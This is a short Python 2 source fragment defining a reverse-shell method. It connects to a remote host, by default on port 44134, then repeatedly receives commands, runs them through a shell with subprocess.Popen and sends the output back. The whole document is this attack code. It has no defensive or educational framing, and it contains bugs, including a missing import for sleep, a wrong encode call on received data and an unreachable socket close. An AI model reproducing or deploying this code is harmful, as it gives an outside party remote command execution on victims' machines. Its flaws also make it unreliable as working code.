# load socket library from python core 
import socket
import subprocess

def reverse_shell(self, host= None, port = None):

    # return 0 is hsot not defined
    if host is None:
        return 0

    # set default port if not defined
    if port is None:
        port = int(44134)

    # sleep for 5 seconds to account for os deleting old socket, binding, connection and garbage collection
    sleep(5)

    try:
        # create socket for connection to host
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # connect to host
        sock.connect((host,port))

        # create place holder for command to be processed
        cmd = ""

        while True:
            self.shell_text(sock, host)

            # receive data from other socket and store it in cmd
            cmd = sock.recv(1024).encode('UTF-8')

            # run the cmd locally and store the process infomation in proc
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

            # store the pipes output in proc out string
            proc_out = "{0} {1}\n".format(proc.stdout.read(),proc.stderr.read())
            
            # send the output of pipe to other socket
            sock.send(proc_out)
        
        # close the socket 
        sock.close()

    except Exception as error:
        print "[-] Failed to create socket: {0}".format(str(error))

    return 0